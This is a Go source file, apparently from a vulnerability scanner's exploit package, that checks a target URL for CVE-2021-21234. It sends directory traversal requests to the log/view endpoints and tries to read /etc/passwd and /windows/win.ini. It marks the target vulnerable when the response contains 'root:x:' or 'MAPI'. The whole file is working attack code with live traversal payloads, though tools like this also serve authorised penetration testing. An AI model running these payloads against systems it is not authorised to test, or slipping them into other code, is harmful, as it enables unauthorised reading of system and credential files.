package exppackage

import (
	"github.com/fatih/color"
	"ssp/common"
	"strings"
)

func CVE_2021_21234(url string, proxyURL string) {
	payloads := []string{
		"manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
		"log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
		"manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
		"log/view?filename=/etc/passwd&base=../../../../../../../../../../",
	}

	// 遍历payload列表并发送请求
	for _, payload := range payloads {
		// 使用 MakeRequest 函数发起 POST 请求
		_, body, err := common.MakeRequest(url+payload, "POST", proxyURL, nil, "")
		if err != nil {
			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
			return
		}

		// 检查响应内容并判断是否存在漏洞
		if strings.Contains(string(body), "MAPI") {
			common.PrintVulnerabilityConfirmation("CVE-2021-21234", url, "存在 [CVE-2021-21234-Win]", "2")
			common.Vulnum++
			return
		} else if strings.Contains(string(body), "root:x:") {
			common.PrintVulnerabilityConfirmation("CVE-2021-21234", url, "存在 [CVE-2021-21234-Linux]", "2")
			common.Vulnum++
			return
		}
	}

	// 如果没有找到漏洞
	color.Yellow("[-] %s 未发现CVE-2021-21234目录遍历漏洞\n", url)
}
